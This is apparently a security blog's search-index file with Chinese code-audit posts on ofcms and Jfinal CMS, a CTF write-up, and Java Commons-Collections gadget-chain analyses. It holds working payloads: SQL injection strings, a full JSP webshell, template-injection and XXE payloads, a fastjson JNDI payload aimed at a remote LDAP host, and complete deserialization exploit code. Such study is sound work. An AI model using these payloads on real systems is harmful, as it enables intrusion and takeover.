<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[【Java代码审计】ofcms 1.1.3]]></title>
    <url>%2F2022%2F10%2F09%2F%5BJava%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5Dofcms%201.1.3%2F</url>
    <content type="text"><![CDATA[写在前面通过审计一些简单的源码学习代码审计。在审计过程感觉还是有很多代码看不懂，不管那么多了，先审起来。 后台sql注入漏洞漏洞复现登录后台后，在系统设置-&gt;代码生成-&gt;添加中输入如下payload 1update of_cms_ad set ad_id=updatexml(1, concat(0x7e, (database()),0x7e),1); 可以看到成功爆出了数据库名。 漏洞分析 通过burp抓包，可以看到请求的路由。 在IDEA中 全局搜索system/generate 可以找到处理这个路由的类文件，在这个文件的45行可以看到一个create方法，刚刚的路由就是调用这个方法。 这里的getPara获取了传入的sql语句 接下来，跟进Db.update中。 继续跟进 继续跟进 这里先是建立了一个数据库连接，然后再次调用了update方法，继续跟进 这里就是比较关键的地方了，conn.prepareStatement是用来预编译sql语句的，executeUpdate 则是可以执行sql语句。 预编译通常都是先构造一个sql语句，然后需要传入的参数用?代替，然后挨个放进去，目的就是为了预防sql注入。但是这整条sql语句我们都能够控制。预编译根本没起到什么作用，也没有对sql做过滤，所以可以自己构造update报错语句进行报错注入。 任意文件上传2漏洞复现 这里先上传一个 文件后缀为 图片格式 png 的 jsp webshell，然后抓包。 当上传gif后缀格式的时候，是可以上传成功的。 但是上传jsp后缀格式就不行，由于是在windows下，使用::$DATA后缀绕过上传 在来看看上传文件目录下 当然，如果直接访问是访问不了的 漏洞分析还是通过burp抓包，查看请求的路由 全局搜索comn/service 在ComnController文件的101行 上面是文件上传的逻辑，jfinal 使用 getFile进行文件上传，跟进getFile 再次跟进 跟进 MultipartRequest类 跟进wrapMultipartRequest方法 在86行调用了一个 isSafeFile的方法 这里拿到了上传文件的文件名，去重并转换成小写，然后判断文件名末尾是否为.jsp或.jspx，如果是则返回flase，就不进行上传。 但是在windows下，绕过的方式可以用shell.jsp::$DATA或在文件名末尾加.，比如shell.jsp. 都会保存为shell.jsp 任意文件上传2漏洞复现 在系统设置-&gt;模板文件中，点击保存，然后burp抓包 这里将 dirs 改成 ../../../static , file_name改成shell.jsp ,file_content改成jsp冰蝎马 1file_path=E%3A%5CTools%5CEnv%5Capache-tomcat-8.5.73%5Cwebapps%5Cofcms_admin%5CWEB-INF%5Cpage%5Cdefault%5Cindex.html&amp;dirs=../../../static&amp;res_path=&amp;file_name=shell.jsp&amp;file_content=&lt;jsp%3aroot+xmlns%3ajsp%3d&quot;http%3a//java.sun.com/JSP/Page&quot;+version%3d&quot;1.2&quot;&gt;&lt;jsp%3adirective.page+import%3d&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;/&gt;&lt;jsp%3adeclaration&gt;+class+U+extends+ClassLoader&#123;U(ClassLoader+c)&#123;super(c)%3b&#125;public+Class+g(byte+[]b)&#123;return+super.defineClass(b,0,b.length)%3b&#125;&#125;&lt;/jsp%3adeclaration&gt;&lt;jsp%3ascriptlet&gt;String+k%3d&quot;e45e329feb5d925b&quot;%3bsession.putValue(&quot;u&quot;,k)%3bCipher+c%3dCipher.getInstance(&quot;AES&quot;)%3bc.init(2,new+SecretKeySpec((session.getValue(&quot;u&quot;)%2b&quot;&quot;).getBytes(),&quot;AES&quot;))%3bnew+U(this.getClass().getClassLoader()).g(c.doFinal(new+sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext)%3b&lt;/jsp%3ascriptlet&gt;&lt;/jsp%3aroot&gt; 在ofcms_admin\static下 可以看到已经成功上传，直接用冰蝎连接 成功拿下 漏洞分析通过burp抓包可以路由为/ofcms_admin/admin/cms/template/save.json 在TemplateController.java文件中 在107行 简单分析下，这里可以通过外部控制 res_path dirs file_name file_content这四个参数。 123fileContent = fileContent.replace(&quot;&amp;lt;&quot;, &quot;&lt;&quot;).replace(&quot;&amp;gt;&quot;, &quot;&gt;&quot;); File file = new File(pathFile, fileName); // 创建文件 文件路径 文件名可控FileUtils.writeString(file, fileContent); // 将内容写入文件中 文件内容可控 经过分析，相当于是文件路径和文件名还有文件内容我们都可以控制，并且没有对文件名和文件内容进行限制，想传入什么都可以。而且文件路径还可以通过../../进行目录穿越，可以实现将文件传入到任意目录下。 1pathFile = new File(SystemUtile.getSiteTemplatePath()); 这条语句则会得到一个基础路径，通过debug可以得知 通过测试，可以访问到网站跟目录下的static下的资源文件，可以控制dirs为 ../../../static 将冰蝎传入到static目录下，冰蝎链接，即可拿下。 模板注入漏洞复现 任选一个payload放在模板文件的任意位置。 1&lt;#assign value=&quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123;value(&quot;calc.exe&quot;)&#125; 1&lt;#assign value=&quot;freemarker.template.utility.ObjectConstructor&quot;?new()&gt;$&#123;value(&quot;java.lang.ProcessBuilder&quot;,&quot;calc.exe&quot;).start()&#125; 1&lt;#assign value=&quot;freemarker.template.utility.JythonRuntime&quot;?new()&gt;&lt;@value&gt;import os;os.system(&quot;calc.exe&quot;)&lt;/@value&gt; 然后让我一个不存在的文件，就会自动跳转到404页面，然后弹出计算器。 漏洞分析这里的原理也很简单，这套网站使用了freemarker作为模板语言，并且我们还能控制网页模板文件，因此，只要能控制网页的地方，都可以将&lt;#assign value=&quot;freemarker.template.utility.Execute&quot;?new()&gt;${value(&quot;calc.exe&quot;)} 执行命令的语句嵌入到网页中，然后访问就会执行。 XML注入漏洞复现首先在本地用python起一个http监听 然后通过上面任意文件上传2的方式上传一个后缀为jrxml格式的文件 ssrf.jrxml内容 1&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;http://127.0.0.1:8000/secret_pass.txt&quot;&gt;%xxe;]&gt; data 1file_path=E%3A%5CTools%5CEnv%5Capache-tomcat-8.5.73%5Cwebapps%5Cofcms_admin%5CWEB-INF%5Cpage%5Cdefault%5Cindex.html&amp;dirs=../../&amp;res_path=&amp;file_name=ssrf.jrxml&amp;file_content=&lt;!DOCTYPE+foo+[&lt;!ENTITY+%25+xxe+SYSTEM+&quot;http%3a//127.0.0.1/secret_pass.txt&quot;&gt;%25xxe%3b]&gt; 然后再访问用户管理-&gt;系统设置-&gt;导出全部，并抓包 发送到Repeater，修改j的参数为 ../ssrf 并提交 python收到了请求 漏洞分析根据路由report找到 ReprotAction.java 这段代码的功能就是用来导出报表的，前端可以传入参数j 可以控制读取 jrxml文件。 假设j传入的是ssrf， 那么 jrxmlFileName 变量得到的路径就是 1/WEB-INF/jrxml/ssrf.jrxml 如果传入 ../ssrf 那么就会加载 WEB-INF目录下的ssrf.jrxml文件，所以通过目录穿越的方式，可以加载任意路径下的jrxml文件 1/WEB-INF/jrxml/../ssrf.jrxml 但是只是加载任意路径下的jrxml 文件，有有什么用呢？ 接下来，在46行中 跟入compileReport 继续跟入 这里的 JRXmlLoader.load(inputStream)这个方法 则可以解析 jrxml。而这里的inputStream 参数就是，刚刚通过j传入的文件名，然后进行拼接后打开文件流，只要能上传一个通过精心构造一个jrxml文件，那么就可以实现ssrf，读取文件。但是这里不会回显读取后的结果，所以只能构造一个实现ssrf jrxml文件。 1&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;http://127.0.0.1:8000/secret_pass.txt&quot;&gt;%xxe;]&gt; 这里就利用了任意文件上传2中保存模板的方式在任意一个路径下，让后修改j的参数去路径下读取，即可加载到这个jrxml文件，实现ssrf攻击。 任意用户密码重置漏洞复现创建一个test用户，并登录到test 修改密码 然后抓包 发送到Repeater，修改user_id 的参数为1，即可修改管理员 admin密码 为 666666 接下来 登录到 admin 成功登录 漏洞分析根据密码重置的路由 /ofcms_admin/admin/system/user/respwd.json 在源码中找到SysUserController.java 在 109行 在 respwd这个方法当中，首先会拿到两次输入的密码进行比对，如果不一致则直接返回，一致则将密码进行Sha256Hash进行加密然后set到Record这个对象中，这个Record对象就是封装了一个Map对象，可以对其进行get，set，最关键的一个地方就是，下面还获取了user_id 也并设置到Record对象中。然后执行Db.update。这里以user_id作为更新条件 从 record中去获取user_id，然后record中的user_id的其实就是外部传入的user_id。所以才可以通过控制user_id来重置任意用户密码。 到此就结束了，在审计的过程当中，有很多代码我都读不懂，读不懂的原因是因为使用了开发框架，没有去使用过，所以看起来很费劲。]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>java代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【Java代码审计】Jfinal CMS]]></title>
    <url>%2F2022%2F10%2F07%2F%5BJava%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5DJfinal%20CMS%2F</url>
    <content type="text"><![CDATA[写在前面学习代码审计，为了练手，在CNVD上找了一个存在漏洞的Jfinal CMS的系统来审计，Jfinal CMS 5.0.1这个版本中在存在一个fastjson反序列漏洞，但是需要登录到后台，而且套代码使用的人并不是很多，所以危害并不大。Jfinal CMS 5.1.0 则存在大量的sql注入漏洞，目前这个版本也是最新版。 CMS命令注入漏洞环境Jfinal CMS 5.0.1 分析过程 只是为了记录，省略部署过程。 在com.jflyfox.component.controller.Ueditor 进入到ActionEnter类中 ActionEnter类的初始化方法中调用了ConfigManager.getInstance，进入ConfigManager getInstance 创建了一个ConfigManager,跟进ConfigManager中 调用了this.initEnv方法，继续跟进 可以看到在该方法中调用了JSONObject.parseObject，将json格式的字符串转换成对象。而该源码中使用的fastjson版本为1.2.28。 在https://mvnrepository.com/网站中可以知道是存在fastjson反序列化漏洞的 而在JSONObject jsonConfig = JSONObject.parseObject(configContent);这条触发fastjson反序列化语句中，我们需要控制configContent的值，来触发反序列化。 可以通过点入ConfigManager.configFileName查看读取的文件名 这个文件就是src/main/resources/config.json文件 怎么去控制这个文件呢？ 通过用户名admin 密码 admin123进入后台 在本地准备一个内容为以下，文件名为config.json的文件 1234567891011&#123; &quot;a&quot;:&#123; &quot;@type&quot;:&quot;java.lang.Class&quot;, &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot; &#125;, &quot;b&quot;:&#123; &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;ldap://ip:1389/xxx&quot;, &quot;autoCommit&quot;:true &#125;&#125; 在服务器起一个JNDI服务 1java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;calc.exe&quot; -A ip 替换成上面构造的即可 接下来，只需要找一个会访问/ueditor的路由,就会弹出计算器 成功执行。 Jfinal SQL注入漏洞环境Jfinal CMS 5.0.1 分析过程 按Shift+Ctrl+R 全局搜索/system/dict 存在漏洞的点 可以看到，拿到了attrVal和orderBy并未经过任何过滤，直接就 append追加到sql语句中去了。 在这个页面中 抓个包 什么都没有 随便点一下 测试 1or+extractvalue(1,concat(0x7e,(database())))# 成功爆出了数据库名。 以下路由的orderBy参数均存在sql注入 12345678910111213141516171819/admin/advicefeedback/admin/article/admin/comment/admin/contact/admin/folder/admin/foldernotice/admin/folderrollpicture/admin/friendlylink/admin/imagealbum/admin/site/admin/videoalbum/admin/video/system/config/system/department/system/dict/system/log/system/menu/system/role/system/user]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>java代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【bugku-WEB】 noteasytrick wp]]></title>
    <url>%2F2022%2F08%2F26%2Fbugku-noteasytrick%20wp%2F</url>
    <content type="text"><![CDATA[天气太热了，学不进去，做做ctf题打发下时间~_~ 考点原生类反序列化 构造不同文件内容相同文件hash值（fastcoll工具） 解题思路题给出的源码 1234567891011121314151617181920212223242526272829303132333435363738394041 &lt;?phperror_reporting(0);ini_set("display_errors","Off");class Jesen &#123; public $filename; public $content; public $me; function __wakeup()&#123; $this-&gt;me = new Ctf(); &#125; function __destruct() &#123; $this-&gt;me-&gt;open($this-&gt;filename,$this-&gt;content); &#125;&#125;class Ctf &#123; function __toString() &#123; return "die"; &#125; function open($filename, $content)&#123; if(!file_get_contents("./sandbox/lock.lock"))&#123; echo file_get_contents(substr($_POST['b'],0,30)); die(); &#125;else&#123; file_put_contents("./sandbox/".md5($filename.time()),$content); die("or you can guess the final filename?"); &#125; &#125;&#125;if(!isset($_POST['a']))&#123; highlight_file(__FILE__); die();&#125;else&#123; if(($_POST['b'] != $_POST['a']) &amp;&amp; (md5($_POST['b']) === md5($_POST['a'])))&#123; unserialize($_POST['c']); &#125;&#125; 解题思路 首先需要通过序列化原生类ZipArchive删除/sandbox/lock.lock文件，这里需要注意的是，不能够直接去序列化ZipArchive类，如果直接对该序列化，序列化中文件的路径值会为空，需要通过题目给出的Jesen类，通过控制$this-&gt;me变量赋值为实例化的ZipArchive，$j1-&gt;filename要赋值为./sandbox/lock.lock，$j1-&gt;content赋值为ZipArchive::OVERWRITE。然后再对Jesen类进行序列化，再将序列化的值进行提交，这里的条件if(($_POST[&#39;b&#39;] != $_POST[&#39;a&#39;]) &amp;&amp; (md5($_POST[&#39;b&#39;]) === md5($_POST[&#39;a&#39;])))先用数组进行绕过。这样就会把lock.lock文件删除掉。 经过上面的操作后，我们就可以绕过if(!file_get_contents(&quot;./sandbox/lock.lock&quot;))这个条件， 但是读取文件file_get_contents(substr($_POST[&#39;b&#39;],0,30))这里用到了$_POST[&#39;b&#39;]接收参数值，这样一来，我们就不能用数组来绕过($_POST[&#39;b&#39;] != $_POST[&#39;a&#39;]) &amp;&amp; (md5($_POST[&#39;b&#39;]) === md5($_POST[&#39;a&#39;]))这个条件，因为我们需要拿到$_POST[&#39;b&#39;]值。 但是我们可以用fastcoll工具来生成两个相同hash，内容不一致的文件。 因为通过substr($_POST[&#39;b&#39;],0,30)只读取了前30位字符串作为参数来执行，可以通过构造./../../../../../../../../flag30位作为文件的前缀，使用fastcoll进行hash碰撞。 最后只需要将两个文件的内容读取出来，然后再提交，就能读取到flag。 但是需要注意的一点就是，如果通过file_get_contents读取出来，对其进行url编码后，然后通过post提交上去，是不行的，经过在本地测试，对两个文件读取出来进行url编码在进行md5加密后得到的值是不一致的。所以在解题过程中我使用file_get_contents直接将文件内容读取出来，然后通过php来提交这个请求，就拿到了flag。 解题过程指定文件前缀通过fastcoll构造hash一致内容不一致的文件。 readflag.txt 1./../../../../../../../../flag 1fastcoll_v1.0.0.5.exe F:\Tools\hash碰撞\readflag.txt 通过原生ZipArchive类，删除/sandbox/lock.lock文件 123456$j1 = new Jesen();$j1-&gt;me = new ZipArchive();$j1-&gt;filename = "./sandbox/lock.lock";$j1-&gt;content = ZipArchive::OVERWRITE;var_dump(serialize($j1)); 1a[]=aaaa&amp;b[]=bbbb&amp;c=O:5:"Jesen":4:&#123;s:8:"filename";s:19:"./sandbox/lock.lock";s:7:"content";i:8;s:2:"me";O:10:"ZipArchive":5:&#123;s:6:"status";i:0;s:9:"statusSys";i:0;s:8:"numFiles";i:0;s:8:"filename";s:0:"";s:7:"comment";s:0:"";&#125;&#125; 读取flag 12345678910111213141516171819&lt;?php$postdata = http_build_query( array( 'a' =&gt; file_get_contents("readflag_msg1.txt"), // hash碰撞出来的文件 'b' =&gt; file_get_contents("readflag_msg2.txt"), 'c' =&gt; "O:5:\"Jesen\":3:&#123;s:8:\"filename\";s:0:\"\";s:7:\"content\";s:0:\"\";s:2:\"me\";N;&#125;" ));$opts = array('http' =&gt; array( 'method' =&gt; 'POST', 'header' =&gt; 'Content-type: application/x-www-form-urlencoded', 'content' =&gt; $postdata ));$context = stream_context_create($opts);$result = file_get_contents('http://114.67.175.224:12225/', false, $context);echo $result;?&gt;]]></content>
      <categories>
        <category>CTF</category>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java反序列化Common-Collections6利用链分析]]></title>
    <url>%2F2022%2F08%2F10%2FJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Common-Collections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[前言上一篇分析了ysoserial中的CC1链，这篇主要分析CC6这条链。 分析之前，先来看看CC6这条链是如何诞生的呢？ 我们都知道，在CC1这条链中，AnnotationInvocationHandler在执行反序列化时，触发的点是memberValues.entrySet()。 这是在JDK 8u70之前，我们来看看JDK 8u70之后的AnnotationInvocationHandler类，这里用的是JDK 8u301。 可以看到，已经将memberValues.entrySet()换成了其他的，在JDK 8u71更高版本中，就无法继续使用这种方式进行利用了。 那有没有一条不受JDK版本限制的链条呢？ 答案肯定是有的，也就是即将准备分析的Common-Collections6利用链。 利用链分析首先，还是先来看看ysoserial的cc6利用链 看起来 还是挺长一串的，但是可以看到，命令执行的方式依旧没变，还是使用了LazyMap的get方法。前面的构造方式已经在《Java反序列化Common-Collections1利用链分析》中说过了，直接对后面的进行分析。 它使用了TiedMapEntry的getValue来触发LazyMap的get方法。 接下来看看哪里调用了getValue方法 在TiedMapEntry的hashCode方法中调用了getValue方法。 在HashMap的hash方法中找到调用hashCode 通过查找引用，可以直接在HashMap的readObject方法中找到 但是ysoserial中并不是使用的HashMap，而是使用的HashSet，其实都是一样的，HashSet的readObject方法只不过是间接地调用了hashCode。 在HashSet的readObject中 put中还是调用了hash 接下来对利用进行梳理，首先 AnnotationInvocationHandler-&gt;readObject AnnotationInvocationHandler-&gt;invoke LazyMap-&gt;get 跟CC1中的一致，原先的AnnotationInvocationHandler类换成了TiedMapEntry的getValue来触发，然后在TiedMapEntry的hashCode调用了getValue，而后HashMap在readObject中直接调用了hash方法，最后hash方法中调用了hashCode方法。 HashSet在readObject中则是通过map.put方法间接调用了hash方法。 注意：这里还有一个细节问题，在创建TiedMapEntry对象的时候，我们需要传递一个map和一个key 这里的map就为LazyMap的实例，而key，我们通常会随便传递一个。 如果我们直接执行，是不会弹出计算器的，这是为什么呢？ 打个断点，调试一下就知道了。 在LazyMap的get map.containsKey(key)是用来判断map中是否存在key这个值，如果不存在，会将key存放到map中，如果存在，就不会执行transform。 为什么会在序列化之前执行到这个方法里面去呢？ 因为需要通过HashSet来触发TiedMapEntry的hashCode，所以我们要将TiedMapEntry通过add方法添加到HashSet中去， 那么在add方法中，也会调用put方法，所以也会间接调用到hash，提前触发命令执行。 那么怎么避免呢？ 其实很简单，只需要在序列化前，用map.remove(key)将HashMap对象中的key移除就好了。 利用链构造得到一条利用链 12345678HashSet-&gt;readObjectHashMap-&gt;putHashMap-&gt;hashHashMap-&gt;hashCodeLazyMap-&gt;getChainedTransformer-&gt;transformConstantTransformer-&gt;transformInvokerTransformer-&gt;transform 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778package com.example;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.util.HashMap;import java.util.HashSet;import java.util.LinkedHashSet;import java.util.Map;public class CC6Test1 &#123; public static void main(String[] args) throws Exception &#123; // 因为map.put方法会触发hash操作，会提前触发有害payload，所以先构造一个无害payload放入 Transformer[] transformers = new Transformer[]&#123;new ConstantTransformer(1)&#125;; // 反序列化真正执行的payload Transformer[] fucktransformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), // 调用Runtime 的 getMethod方法 通过getMethod方法 找到 getRuntime 方法 new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[0]&#125;), // 调用 getRuntime 返回 Runtime 对象 new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), // 调用 Runtime 对象的 exec 方法 执行命令 new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"calc.exe"&#125;) &#125;; // 将Transformer数组串联起来 ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);// chainedTransformer.transform(1); // 通过HashMap.get方法触发transform HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;(); Map map1 = LazyMap.decorate(map, chainedTransformer); TiedMapEntry tiedMapEntry = new TiedMapEntry(map1, 11); HashSet&lt;Object&gt; hashSet = new HashSet&lt;&gt;(); hashSet.add(tiedMapEntry); // 绕过 map.containsKey(key) map.remove(11); setFieldValue(chainedTransformer, "iTransformers", fucktransformers); byte[] serialize = Serialize(hashSet); UnSerialize(serialize); &#125; // 通过反射设置类属性 public static void setFieldValue(Object obj1, String s1, Object obj2) throws Exception&#123; Class clazz = obj1.getClass(); Field field = clazz.getDeclaredField(s1); field.setAccessible(true); field.set(obj1, obj2); &#125; public static byte[] Serialize(Object obj) throws Exception&#123; ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(obj); return baos.toByteArray(); &#125; public static void UnSerialize(byte[] bytes) throws Exception&#123; ByteArrayInputStream bais = new ByteArrayInputStream(bytes); ObjectInputStream ois = new ObjectInputStream(bais); ois.readObject(); &#125;&#125; 文章逻辑可能写得有点混乱，希望大佬们多多指教。]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>java安全漫谈</tag>
        <tag>java反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java反序列化Common-Collections1利用链分析]]></title>
    <url>%2F2022%2F08%2F09%2FJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Common-Collections1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[前言之前在Java安全学习笔记（2）中写过Common-Collections这条链学习笔记，笔记是跟着p牛的java安全漫谈系列写的，利用的点都是一致的，只是触发的点，p牛用的是TransformedMap这个类，ysoserial是用的LazyMap，使用LazyMap触发的这条链用到了对象代理技术，接下来这边文章，就来分析ysoserial中Common-Collections1这条链的利用方式。 环境commons-collections &lt;= 3.2.1 JDK &lt;= 8u70 （从8u71之后修复了） 利用链分析在ysoserial中Common-Collections1的payload 看起来比URLDNS的payload多了不少代码，拆分后来看其实也还好，首先看看构造利用点的三个关键类ConstantTransformer、InvokerTransformer、ChainedTransformer。 首先来看看ChainedTransformer这个类的transform方法 这个方法类似于链式调用一样，将iTransformers这个数组中的对象的transform都调用一遍，并且传入的参数是上一次个对象调用后的结果，这可能听起来有点绕，用idea多跟几遍也就明白了。 再来看看ConstantTransformer这个类的transform方法 这个方法只返回了一个对象，在创建对象的时候可以控制iConstan参数，比如创建对象我传入一个Runtime.class，那么调用该方法，返回的就是Runtime.class。 最后再来看看触发命令执行的类InvokerTransformer的transform方法 学了反射的都知道，这个方法的作用就是传入一个对象，通过反射去获取这个这个对象的任意方法，然后再调用。并且在创建InvokerTransformer对象的时候，可以控制传入的方法名和参数。 接下来，通过new一个InvokerTransformer对象，执行transform方法，来弹出一个计算器。 成功达到执行命令的效果。 看看ysoserial中执行命令的方式 为什么ysoserial中不是直接调用exec来触发命令的呢？ 因为Runtime这个类是没有实现Serializable接口，不能对其进行反序列化，直接反序列化会进行报错。 解决这个问题的方式就是通过反射调用Runtime.getRuntime().exec()方法。 当执行InvokerTransformer的transform方法时，我们可以先获取到Runtime的getMethod方法，在通过获取的到getMethod的去获取getRuntime方法，有点套娃的感觉，反射获取反射方法。然后再调用获取到Runtime对象，最后exec执行命令。 接下来，只需要调用ChainedTransformer的transform方法，就会将整个transforms数组中的对象串联起来，挨个执行transform方法，前一个对象的返回结果作为后一个对象的参数值。 到这里，我们只需要找出一条xx.readObject -&gt; gadget-&gt; ChainedTransformer.transform即可。 ysoserial中是用的LazyMap的get方法。 然后再通过AnnotationInvocationHandler的invoke方法调用LazyMap的get方法 那要怎么才能调用到AnnotationInvocationHandler的invoke方法呢？答案是使用对象代理。 Java对象动态代理Java对象代理是一种设计模式，提供了对目标对象另外的访问方式，即通过代理对象访问目标对象。可以不修改目标对象，对目标对象功能进行拓展。生活中也有类似的例子，生活中常见的例子就是，去电影院看电影，电影院播放的电影都是制片厂商授权给电影院播放，电影院就像一个代理商，除了播放电影，在观影期间，电影院还可以再开头和结尾插播一下广告。而Java对象代理，可以通过代理原来的对象，在不修改原来对象的基础对其功能进行增强和扩展。 关于Java对象代理网上有很多文章，就不展开写了，主要还是分析利用链。 Java中对象动态代理的方法 1Proxy.newProxyInstance(ClassLoader loader,Class&lt;?&gt;[] interfaces,InvocationHandler h) ClassLoader loader 传递一个类加载器，使用对象默认的加载器即可 Class&lt;?&gt;[] interfaces 传递一个接口，对那个接口使用动态代理 InvocationHandler h 传递一个InvocationHandler对象，这个对象的作用就是处理被代理的对象需要做的逻辑。InvocationHandler 是一个接口，有一个invoke方法，当被代理对象调用任意方法时，都会调用invoke方法。 ysoserial中则是对LazyMap对象进行了动态代理，对其进行序列化，在执行readObject反序列化过程中，只要被代理过的对象调用任意方法，都会执行invoke方法。 重新再梳理一遍，我们通过构造三个InvokerTransformer这个类对象，达到了以反射的方式调用了Runtime类的exec方法执行命令，再构造一个Transformer数组，将该数组作为参数创建ChainedTransformer对象，然后只需要调用ChainedTransformer的transform方法，就能弹出计算机。 但是如果通过反序列化来调用的话，需要构造一条gadget。在LazyMap的get方法中，factory变量调用了transform方法。在AnnotationInvocationHandler的invoke方法中，memberValues变量调用了get方法。那问题来了，要怎么在反序列化的情况下调用到invoke方法呢？ 先看看什么情况下，会调用到invoke？ 对对象进行动态代理，创建一个继承InvocationHandler类的实例，重写invoke方法，在创建代理的时候传入这个实例，当这个实例调用任意方法的时候，就会自动触发调用invoke。 而在AnnotationInvocationHandler的readObject方法中，有一条语句memberValues.entrySet。 假设我们传入被动态代理过后的LazyMap对象，是不是就可以触发调用invoke方法了呢？ 答案是肯定的。 直接弹出来计算机。 利用链至此，我们得到一个利用链 123456AnnotationInvocationHandler-&gt;readObjectAnnotationInvocationHandler-&gt;invokeLazyMap-&gt;getChainedTransformer-&gt;transformConstantTransformer-&gt;transformInvokerTransformer-&gt;transform 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273package org.example;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.annotation.Retention;import java.lang.reflect.*;import java.util.HashMap;import java.util.Map;public class test &#123; public static void main(String[] args) throws Exception&#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime",null&#125;), new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"calc"&#125;) &#125;; // 先传入一个无害的payload 防止序列化前就执行 ChainedTransformer transformer = new ChainedTransformer(new Transformer[]&#123;new ConstantTransformer(1)&#125;); HashMap&lt;Object, Object&gt; map = new HashMap&lt;Object, Object&gt;(); Map decorate = LazyMap.decorate(map, transformer); Class&lt;?&gt; AnnotationInvocation = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler"); Constructor&lt;?&gt; declaredConstructor = AnnotationInvocation.getDeclaredConstructor(Class.class, Map.class); declaredConstructor.setAccessible(true); InvocationHandler h = (InvocationHandler)declaredConstructor.newInstance(Retention.class, decorate); Object o1 = Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]&#123;Map.class&#125;, h);// System.out.println(o1 instanceof Proxy); setFieldValue(transformer, "iTransformers", transformers); // 将被代理的对象重新实例化进行 InvocationHandler InvocationHandler h1 = (InvocationHandler)declaredConstructor.newInstance(Retention.class, o1); // 将payload修改回来 ByteArrayOutputStream serializ = Serializ(h1); UnSerializ(serializ); &#125; // 序列化 public static ByteArrayOutputStream Serializ(Object o) throws Exception &#123; // 序列化 ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream outputStream = new ObjectOutputStream(barr); outputStream.writeObject(o); return barr; &#125; // 反序列化 public static void UnSerializ(ByteArrayOutputStream baos) throws Exception &#123; ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray()); ObjectInputStream ois = new ObjectInputStream(bais); ois.readObject(); &#125; // 反射修改对象的变量值 public static void setFieldValue(Object o, String f, Object v) throws Exception&#123; Class c = o.getClass(); Field field = c.getDeclaredField(f); field.setAccessible(true); field.set(o, v); &#125;&#125; 参考文章java动态代理 https://blog.csdn.net/zcc_0015/article/details/22695647]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>java安全漫谈</tag>
        <tag>java反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java反序列化URLDNS利用链分析]]></title>
    <url>%2F2022%2F08%2F07%2FJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96URLDNS%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%2F</url>
